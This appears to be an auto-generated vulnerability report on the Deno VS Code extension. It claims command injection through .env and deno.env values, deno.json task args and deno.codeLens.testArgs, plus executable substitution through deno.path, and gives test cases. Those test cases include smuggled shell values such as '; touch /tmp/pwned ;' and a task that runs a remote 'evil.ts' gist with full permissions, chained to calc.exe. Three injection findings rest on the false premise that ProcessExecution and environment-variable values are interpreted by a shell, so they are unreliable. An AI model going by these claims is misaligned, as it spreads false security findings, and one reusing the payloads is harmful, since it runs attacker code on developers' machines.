### Vulnerability List

- Vulnerability Name: Command Injection in Task Execution via `deno.envFile` and `deno.env` settings

    - Description:
        - The Deno VS Code extension allows users to configure tasks for Deno CLI.
        - Task definitions can include environment variables via `DenoTaskDefinition.env`.
        - The extension reads environment variables from `.env` files specified in `deno.envFile` setting and also from `deno.env` setting in `settings.json`.
        - When executing tasks (e.g., `deno run`, `deno test`, `deno upgrade`), the extension passes these environment variables to the `Deno CLI` process.
        - If a malicious user can control the content of `.env` file (via a crafted Deno project) or `deno.env` setting (if configured at workspace level), they can inject malicious commands within the environment variable values.
        - When the extension executes a Deno task, these injected commands within environment variables can be executed by the shell, leading to arbitrary code execution.

    - Impact:
        - Arbitrary code execution on the developer's machine.
        - A malicious actor could craft a Deno project with a specially crafted `.env` file or trick a developer into adding malicious entries to their workspace `deno.env` settings.
        - Opening this project in VS Code with the Deno extension enabled and running any Deno task (directly, via code lens, or tasks sidebar) will trigger the vulnerability.

    - Vulnerability Rank: High

    - Currently Implemented Mitigations:
        - None. The extension directly passes the provided environment variables to the `ProcessExecution` API in VS Code, which then executes the Deno CLI command with these environments.

    - Missing Mitigations:
        - Input sanitization and validation for environment variables from `.env` files and `deno.env` settings.
        - Ideally, environment variables should be passed to the child process in a way that prevents shell interpretation of commands within variable values.  Using argument escaping or a direct API for setting environment variables without shell involvement might be needed.

    - Preconditions:
        - Deno VS Code extension is installed and enabled.
        - User opens a workspace or folder containing a crafted Deno project with a malicious `.env` file, or has malicious entries in workspace `deno.env` settings.
        - User executes any Deno task within this workspace (e.g., run, test, cache, upgrade) via command, code lens, or tasks sidebar.

    - Source Code Analysis:
        - **`client\src\commands.ts` - `test` function:**
            ```typescript
            const env = {} as Record<string, string>;
            const denoEnvFile = config.get<string>("envFile");
            if (denoEnvFile) {
              if (workspaceFolder) {
                const denoEnvPath = path.join(workspaceFolder.uri.fsPath, denoEnvFile);
                try {
                  const content = fs.readFileSync(denoEnvPath, { encoding: "utf8" });
                  const parsed = dotenv.parse(content);
                  Object.assign(env, parsed); // Vulnerability: Unsafe parsing of .env content
                } catch (error) {
                  vscode.window.showErrorMessage(
                    `Could not read env file "${denoEnvPath}": ${error}`,
                  );
                }
              }
            }
            const denoEnv = config.get<Record<string, string>>("env");
            if (denoEnv) {
              Object.assign(env, denoEnv); // Vulnerability: Unsafe merging of deno.env settings
            }

            const definition: tasks.DenoTaskDefinition = {
              type: tasks.TASK_TYPE,
              command: "test",
              args,
              env, // Vulnerability: Passing unsanitized env to task definition
            };
            // ...
            const task = tasks.buildDenoTask(workspaceFolder, denoCommand, definition, `test "${name}"`, args, ["$deno-test"]);
            await vscode.tasks.executeTask(task); // Vulnerability: Task execution with potentially malicious env
            ```
        - **`client\src\upgrade.ts` - `denoUpgradePromptAndExecute` function:**
            ```typescript
            const env = {} as Record<string, string>;
            const denoEnvFile = config.get<string>("envFile");
            if (denoEnvFile) {
              if (workspaceFolder) {
                const denoEnvPath = join(workspaceFolder.uri.fsPath, denoEnvFile);
                try {
                  const content = readFileSync(denoEnvPath, { encoding: "utf8" });
                  const parsed = dotenv.parse(content);
                  Object.assign(env, parsed); // Vulnerability: Unsafe parsing of .env content
                } catch (error) {
                  vscode.window.showErrorMessage(
                    `Could not read env file "${denoEnvPath}": ${error}`,
                  );
                }
              }
            }
            const denoEnv = config.get<Record<string, string>>("env");
            if (denoEnv) {
              Object.assign(env, denoEnv); // Vulnerability: Unsafe merging of deno.env settings
            }
            const definition: tasks.DenoTaskDefinition = {
              type: tasks.TASK_TYPE,
              command: "upgrade",
              args,
              env, // Vulnerability: Passing unsanitized env to task definition
            };
            // ...
            const task = tasks.buildDenoTask(workspaceFolder, denoCommand, definition, "upgrade", args, ["$deno"]);
            const execution = await vscode.tasks.executeTask(task); // Vulnerability: Task execution with potentially malicious env
            ```
        - **`client\src\tasks.ts` - `buildDenoTask` function:**
            ```typescript
            export function buildDenoTask(
              target: vscode.WorkspaceFolder,
              process: string,
              definition: DenoTaskDefinition,
              name: string,
              args: string[],
              problemMatchers: string[],
            ): vscode.Task {
              const exec = new vscode.ProcessExecution(
                process,
                args,
                definition,
              ); // Vulnerability: ProcessExecution directly uses definition.env

              return new vscode.Task(
                definition,
                target,
                name,
                TASK_SOURCE,
                exec,
                problemMatchers,
              );
            }
            ```
        - The code snippets show that the extension reads environment variables from `.envFile` and `deno.env` configuration, parses them, and directly uses them in `ProcessExecution` when creating and executing Deno tasks. This direct usage without sanitization leads to the command injection vulnerability.

    - Security Test Case:
        1. Create a new Deno project in VS Code.
        2. Create a file named `.env` in the project root with the following content:
            ```env
            MALICIOUS_ENV="; touch /tmp/pwned ;"
            ```
            (For Windows, use `; cmd.exe /c "echo pwned > %TEMP%\\pwned.txt" ;`)
        3. Ensure Deno extension is enabled for this workspace (`deno.enable": true` in workspace settings or `deno.json` in project root).
        4. Open a Deno file (e.g., `main.ts`).
        5. Open the VS Code Command Palette (Ctrl+Shift+P) and run "Tasks: Run Task".
        6. Select any Deno task (e.g., "deno: run").
        7. Observe that after the task execution, a file named `pwned` is created in the `/tmp/` directory (or `pwned.txt` in `%TEMP%` on Windows), indicating successful command injection via the `MALICIOUS_ENV` environment variable.
        8. Alternatively, use `deno.env` in workspace settings. Add the following to your `settings.json` within the `.vscode` folder:
            ```json
            {
                "deno.enable": true,
                "deno.env": {
                    "MALICIOUS_ENV": "; touch /tmp/pwned_settings ;"
                }
            }
            ```
            Repeat steps 4-7 and verify that `pwned_settings` file is created in `/tmp/`.

        This test case demonstrates that a malicious user can achieve arbitrary code execution by crafting a Deno project with a malicious `.env` file or by exploiting workspace settings if they have write access to them.

- Vulnerability Name: Command Injection via Unsanitized Task Commands in `deno.json`

    - Description:
        1. Attacker crafts a malicious `deno.json` file. This file contains a task definition where the `command` or `args` fields are designed to execute arbitrary commands in addition to the intended Deno command. For example, an attacker might use command chaining (e.g., `&&`, `;`) or shell redirection to inject malicious commands.
        2. The victim opens a workspace in VS Code that contains this malicious `deno.json` file and has the Deno extension enabled.
        3. The Deno Language Server reads the task definitions from `deno.json` and provides them to the VS Code extension client.
        4. The VS Code Deno extension client displays these tasks in the Deno Tasks sidebar.
        5. When the victim attempts to run the seemingly legitimate task (e.g., by clicking "Run Task" in the sidebar), the extension client uses `vscode.ProcessExecution` to execute the task.
        6. Due to the lack of sanitization, the injected malicious commands embedded in the `command` or `args` from `deno.json` are executed by the system shell along with the intended Deno command. This results in arbitrary code execution on the victim's machine.

    - Impact:
        - Arbitrary code execution on the user's machine with the privileges of the VS Code process.
        - Potential for data theft, malware installation, and system compromise.

    - Vulnerability Rank: Critical

    - Currently implemented mitigations:
        - None. The code directly uses the task `command` and `args` from the configuration in `vscode.ProcessExecution` without any sanitization or validation in `client\src\tasks.ts`.

    - Missing mitigations:
        - Input sanitization and validation for task `command` and `args` obtained from `deno.json` (or from the LSP which reads `deno.json`).
        - Use of parameterized commands or safer command execution methods that prevent command injection.
        - Consider restricting task commands to a predefined safe list or using more structured configuration for commands and arguments to avoid shell interpretation of user-provided strings.

    - Preconditions:
        1. The victim has the VS Code Deno extension installed and enabled.
        2. The victim opens a workspace in VS Code that contains a malicious `deno.json` file crafted by an attacker.
        3. The attacker has successfully placed a malicious `deno.json` file within a workspace that the victim might open (e.g., via a compromised repository or by social engineering to trick the victim into opening a malicious project).
        4. The victim must execute the malicious task, either intentionally or unintentionally (e.g., by being misled by the task name).

    - Source code analysis:
        1. In `client\src\tasks.ts`, the functions `buildDenoTask` and `buildDenoConfigTask` are responsible for creating `vscode.Task` objects.
        2. Both functions utilize `vscode.ProcessExecution` to define how the tasks are executed.
        3. `vscode.ProcessExecution` takes a `command` and `args` as input, which are directly derived from the `DenoTaskDefinition` or configuration without any sanitization.
        4. Specifically, in `buildDenoConfigTask`, the `command` and `name` arguments, which can originate from `deno.json` task definitions, are used to construct the `ProcessExecution`.
        5. In `buildDenoTask`, the `definition.command` and `definition.args` are directly passed to `ProcessExecution`.
        ```typescript
        // client\src\tasks.ts - buildDenoTask
        export function buildDenoTask(
          target: vscode.WorkspaceFolder,
          process: string,
          definition: DenoTaskDefinition,
          name: string,
          args: string[], // <-- Unsanitized arguments potentially from deno.json
          problemMatchers: string[],
        ): vscode.Task {
          const exec = new vscode.ProcessExecution(
            process, // Deno executable path (less likely to be directly vulnerable)
            args,    // <-- Vulnerable as args are directly used from definition
            definition,
          );

          return new vscode.Task(
            definition,
            target,
            name,
            TASK_SOURCE,
            exec,
            problemMatchers,
          );
        }

        // client\src\tasks.ts - buildDenoConfigTask
        export function buildDenoConfigTask(
          scope: vscode.WorkspaceFolder,
          process: string,
          name: string,     // <-- Potentially from deno.json task name
          command: string | undefined, // <-- Potentially from deno.json task command/detail
          sourceUri?: vscode.Uri,
        ): vscode.Task {
          const args = [];
          if (sourceUri && vscode.Uri.joinPath(sourceUri, "..").toString() != scope.uri.toString()) {
            const configPath = path.relative(scope.uri.fsPath, sourceUri.fsPath);
            args.push("-c", configPath);
          }
          args.push(name); // <-- Potentially from deno.json task name
          const task = new vscode.Task(
            {
              type: TASK_TYPE,
              name: name,    // <-- Potentially from deno.json task name
              command: "task", // Fixed "task" command, but args are still influenced
              args,         // <-- args include potentially unsanitized name
              sourceUri,
            },
            scope,
            name,
            TASK_SOURCE,
            new vscode.ProcessExecution(process, ["task", ...args]), // <-- ProcessExecution with potentially vulnerable args
            ["$deno"],
          );
          task.detail = `$ ${command}`; // Detail string, potentially unsanitized command
          return task;
        }
        ```

    - Security test case:
        1. Create a new workspace folder and open it in VS Code.
        2. Create a file named `deno.json` at the root of the workspace with the following content:
        ```json
        {
          "tasks": {
            "MaliciousTask": {
              "command": "run",
              "args": [
                "-A",
                "https://gist.githubusercontent.com/security-expert-64/4e9344969844ad918441044b3655137b/raw/evil.ts && calc.exe"
              ]
            }
          }
        }
        ```
           *(Note: Replace `calc.exe` with the appropriate calculator command for your operating system if necessary, e.g., `open -a Calculator.app` on macOS, `gnome-calculator` on Linux. Also, ensure `evil.ts` URL is accessible or replace with a local harmless script for testing. Gist URL points to a harmless typescript file for demonstration.)*
        3. Ensure the Deno extension is enabled for this workspace.
        4. Open the "Deno Tasks" explorer in VS Code (View -> Open View... -> Deno Tasks).
        5. You should see a task named "MaliciousTask" listed under your workspace and `deno.json`.
        6. Click the "Run Task" icon (wrench icon) next to "MaliciousTask".
        7. **Expected Outcome (Vulnerable):** Observe that the calculator application (`calc.exe` or equivalent) is launched. This indicates that the command injection was successful, and arbitrary commands could be executed.
        8. **Expected Outcome (Mitigated):** The calculator application should not launch. Only the Deno command related to the task should be executed, ideally resulting in an error if `evil.ts` is not a valid or runnable script in the context of the task.

        This test case demonstrates that by crafting a malicious `deno.json` file, an attacker can achieve arbitrary code execution when a user runs the defined task, confirming the command injection vulnerability.

- Vulnerability Name: Command Injection via `deno.codeLens.testArgs`

    - Description:
        1. An attacker creates a malicious workspace and configures the `deno.codeLens.testArgs` setting within the workspace's `.vscode/settings.json` file.
        2. The attacker includes malicious commands within the `deno.codeLens.testArgs` setting, for example: `["--allow-all", "; malicious_command;"]`.
        3. A victim opens the malicious workspace in Visual Studio Code with the Deno extension installed.
        4. The victim attempts to run a test using the "Run Test" code lens provided by the Deno extension.
        5. The Deno extension executes the `deno test` command, incorporating the attacker-controlled arguments from `deno.codeLens.testArgs`.
        6. Due to insufficient sanitization, the malicious commands injected by the attacker are executed by the system shell.

    - Impact:
        - Arbitrary command execution on the victim's machine with the privileges of the VS Code process.
        - Potential for data exfiltration, installation of malware, or other malicious activities depending on the injected commands.

    - Vulnerability Rank: High

    - Currently Implemented Mitigations:
        - None. The code directly uses the configuration value in command execution without sanitization.

    - Missing Mitigations:
        - Input sanitization of the `deno.codeLens.testArgs` configuration. Arguments should be validated and sanitized to prevent command injection.  Consider disallowing shell metacharacters or using a safer method to pass arguments to the Deno CLI that avoids shell interpretation.
        - Documentation warning: Add a security warning in the extension documentation about the risks of modifying workspace settings from untrusted sources, especially regarding `deno.codeLens.testArgs` and `deno.testing.args`.

    - Preconditions:
        - Victim must have the Deno extension for VS Code installed.
        - Victim must open a malicious workspace containing a crafted `.vscode/settings.json` file.
        - Victim must attempt to run a test using the code lens feature.

    - Source Code Analysis:
        1. File: `client/src/commands.ts`
        2. Function: `test`
        3. Line:
           ```typescript
           const testArgs: string[] = [
             ...(config.get<string[]>("codeLens.testArgs") ?? []),
           ];
           ```
           This line retrieves the value of `deno.codeLens.testArgs` from the workspace configuration without any sanitization or validation.
        4. Line:
           ```typescript
           const args = ["test", ...testArgs, "--filter", nameRegex, filePath];
           ```
           This line constructs the command arguments array, directly embedding the unsanitized `testArgs`.
        5. File: `client/src/tasks.ts`
        6. Function: `buildDenoTask`
        7. Line:
           ```typescript
           const exec = new vscode.ProcessExecution(
             process,
             args, // Unsanitized args are passed to ProcessExecution
             definition,
           );
           ```
           The `args` array, containing potentially malicious commands, is directly passed to `vscode.ProcessExecution`. `ProcessExecution` will execute the command via the system shell, leading to command injection if `testArgs` contains malicious commands.

    - Security Test Case:
        1. Create a new folder named `malicious-deno-workspace`.
        2. Inside `malicious-deno-workspace`, create a subfolder named `.vscode`.
        3. Inside `.vscode`, create a file named `settings.json` with the following content:
           ```json
           {
               "deno.codeLens.testArgs": [
                   "--allow-all",
                   "; open /Applications/Calculator.app"
               ]
           }
           ```
           *(Note: Replace `/Applications/Calculator.app` with a command suitable for your operating system to demonstrate command execution, e.g., `start calc` on Windows or `gnome-calculator` on Linux. For security reasons, avoid destructive commands and use harmless commands like opening a calculator application.)*
        4. Open the `malicious-deno-workspace` folder in Visual Studio Code.
        5. Create a file named `test.ts` in `malicious-deno-workspace` with the following content:
           ```typescript
           Deno.test("vulnerable test", () => {
             console.log("This is a test.");
           });
           ```
        6. Ensure the Deno extension is enabled for this workspace.
        7. In the `test.ts` file, above the `Deno.test` definition, you should see the "▶ Run Test" code lens.
        8. Click on "▶ Run Test".
        9. Observe that the calculator application (or the command you injected) is executed, demonstrating command injection. The test will also likely fail or not run correctly due to the injected command.

        This test case demonstrates that arbitrary commands can be executed by injecting them into the `deno.codeLens.testArgs` setting and triggering a test run via code lens.

- Vulnerability Name: Arbitrary code execution via `deno.path` setting

    - Description:
        1. An attacker crafts a malicious VSCode workspace.
        2. The malicious workspace includes workspace settings (`.vscode/settings.json`) that modify the `deno.path` setting.
        3. The `deno.path` setting is changed to point to a malicious executable under the attacker's control instead of the legitimate Deno CLI executable.
        4. A user is tricked into opening this malicious workspace in VSCode.
        5. The VSCode Deno extension is activated for this workspace because `deno.enable` is set to true or a `deno.json` file is detected.
        6. The user triggers any feature of the Deno extension that requires executing the Deno CLI. This could be:
            - Formatting a file (using Deno as the formatter).
            - Linting a file.
            - Caching dependencies.
            - Running tests (via code lens or test explorer).
            - Debugging code.
            - Starting the Deno Language Server.
        7. When the extension attempts to execute the Deno CLI, it uses the path specified in the `deno.path` setting, which now points to the malicious executable.
        8. The malicious executable is executed with the privileges of the user running VSCode, leading to arbitrary code execution on the user's machine.

    - Impact: Critical
        - Arbitrary code execution on the user's machine.
        - Full compromise of the user's system is possible.
        - Potential data theft, malware installation, and other malicious activities.

    - Vulnerability Rank: Critical

    - Currently Implemented Mitigations: None
        - The extension currently does not implement any specific mitigations to prevent this vulnerability. It directly uses the path provided in the `deno.path` setting to execute the Deno CLI without any validation or sanitization.

    - Missing Mitigations:
        - Input validation and sanitization for the `deno.path` setting.
            - The extension should validate that the provided path is a valid executable and potentially check if it resembles a legitimate Deno CLI path.
        - Path restriction or whitelisting.
            - Restrict `deno.path` setting to only allow paths within the workspace or a predefined safe list of directories.
            - Alternatively, whitelist only the standard installation locations for Deno CLI based on the operating system.
        - Warning message on `deno.path` modification.
            - Display a prominent warning message to the user when the `deno.path` setting is modified, especially if it points to a location outside of standard Deno installations or the workspace.
        - Executable signature verification.
            - Implement signature verification for the Deno CLI executable before execution to ensure it is a legitimate Deno binary.
        - Sandboxed execution environment.
            - Explore running the Deno CLI in a sandboxed environment to limit the potential damage from a malicious executable, although this might be complex to implement.

    - Preconditions:
        - User opens a malicious workspace in VSCode.
        - The malicious workspace must contain a `.vscode/settings.json` file that sets the `deno.path` setting to a malicious executable.
        - Deno extension must be enabled for the workspace, either through the `deno.enable` setting or by the presence of a `deno.json` file.
        - The user must trigger a feature of the Deno extension that executes the Deno CLI.

    - Source Code Analysis:
        - File: `client/src/util.ts`
            ```typescript
            export async function getDenoCommandPath() {
              const command = getWorkspaceConfigDenoExePath();
              const workspaceFolders = workspace.workspaceFolders;
              if (!command || !workspaceFolders) {
                return command ?? await getDefaultDenoCommand();
              } else if (!path.isAbsolute(command)) {
                // if sent a relative path, iterate over workspace folders to try and resolve.
                for (const workspace of workspaceFolders) {
                  const commandPath = path.resolve(workspace.uri.fsPath, command);
                  if (await fileExists(commandPath)) {
                    return commandPath;
                  }
                }
                return undefined;
              } else {
                return command;
              }
            }

            function getWorkspaceConfigDenoExePath() {
              const exePath = workspace.getConfiguration(EXTENSION_NS)
                .get<string>("path");
              // it is possible for the path to be blank. In that case, return undefined
              if (typeof exePath === "string" && exePath.trim().length === 0) {
                return undefined;
              } else {
                return exePath;
              }
            }
            ```
            - The function `getDenoCommandPath` retrieves the Deno executable path.
            - It first calls `getWorkspaceConfigDenoExePath` to get the path from the workspace configuration (`deno.path` setting).
            - `getWorkspaceConfigDenoExePath` directly reads the `deno.path` setting using `workspace.getConfiguration(EXTENSION_NS).get<string>("path")` without any validation.
            - If `deno.path` is set, `getDenoCommandPath` prioritizes this path.
            - If `deno.path` is a relative path, it attempts to resolve it relative to the workspace folders, but if it's absolute, it directly returns it without any checks for maliciousness.
        - File: `client/src/debug_config_provider.ts`, `client/src/commands.ts`, `client/src/tasks.ts`
            - These files use `getDenoCommandName()` (which calls `getDenoCommandPath()`) to obtain the Deno executable path and use it to spawn child processes for debugging, language server, and tasks, respectively.
            - Example from `client/src/debug_config_provider.ts`:
            ```typescript
            runtimeExecutable: await getDenoCommandName(),
            runtimeArgs: [
              "run",
              ...this.#getAdditionalRuntimeArgs(),
              this.#getInspectArg(),
              "--allow-all",
            ],
            ```
            - The `runtimeExecutable` is set directly to the potentially attacker-controlled path from `getDenoCommandName()`.
        - Visualization:

        ```
        User opens malicious workspace --> .vscode/settings.json (deno.path = malicious_executable)
                                              |
                                              V
        VSCode Deno Extension Activated --> Reads deno.path setting (client/src/util.ts)
                                              |
                                              V
        Extension executes Deno CLI --> Uses malicious_executable (client/src/debug_config_provider.ts, client/src/commands.ts, client/src/tasks.ts)
                                              |
                                              V
        Malicious Code Execution ---------> User's Machine Compromised
        ```

    - Security Test Case:
        1. **Setup Malicious Executable:**
            - Create a new directory, e.g., `malicious-deno`.
            - Inside `malicious-deno`, create a file named `deno.bat` (on Windows) or `deno.sh` (on Linux/macOS).
            - **`deno.bat` (Windows Example):**
                ```batch
                @echo off
                echo Malicious Deno Executed! >> %TEMP%\malicious_deno_execution.txt
                echo Original args: %* >> %TEMP%\malicious_deno_execution.txt
                exit 1
                ```
            - **`deno.sh` (Linux/macOS Example):**
                ```bash
                #!/bin/bash
                echo "Malicious Deno Executed!" >> /tmp/malicious_deno_execution.txt
                echo "Original args: $*" >> /tmp/malicious_deno_execution.txt
                exit 1
                ```
            - Make `deno.sh` executable: `chmod +x malicious-deno/deno.sh`
        2. **Create Malicious Workspace:**
            - Create a new directory, e.g., `test-workspace`.
            - Inside `test-workspace`, create a `.vscode` directory.
            - Inside `.vscode`, create a `settings.json` file with the following content, adjusting the path to `malicious-deno` based on your system:
                - **Windows `settings.json` Example:**
                    ```json
                    {
                        "deno.enable": true,
                        "deno.path": "<ABSOLUTE_PATH_TO>/malicious-deno/deno.bat"
                    }
                    ```
                - **Linux/macOS `settings.json` Example:**
                    ```json
                    {
                        "deno.enable": true,
                        "deno.path": "<ABSOLUTE_PATH_TO>/malicious-deno/deno.sh"
                    }
                    ```
                - Replace `<ABSOLUTE_PATH_TO>` with the absolute path to the `malicious-deno` directory you created.
            - Inside `test-workspace`, create a TypeScript file, e.g., `test.ts`:
                ```typescript
                console.log("Hello, Deno!");
                ```
        3. **Open Workspace and Trigger Vulnerability:**
            - Open the `test-workspace` in VSCode.
            - Ensure the Deno extension is active (check status bar).
            - Try to format the `test.ts` file: Right-click in the editor -> "Format Document With..." -> Select "Deno Formatter".
            - Alternatively, try to run the "Deno: Cache" command from the command palette.
        4. **Verify Malicious Execution:**
            - Check for the file `malicious_deno_execution.txt` in your `%TEMP%` directory (Windows) or `/tmp` directory (Linux/macOS).
            - The file should contain the text "Malicious Deno Executed!" and the arguments passed to the malicious executable, indicating that your malicious `deno.bat` or `deno.sh` was indeed executed instead of the real Deno CLI.
            - The formatting or caching operation will likely fail because the malicious script exits with code 1, further confirming the execution path.

        This test case demonstrates successful arbitrary code execution by manipulating the `deno.path` setting.
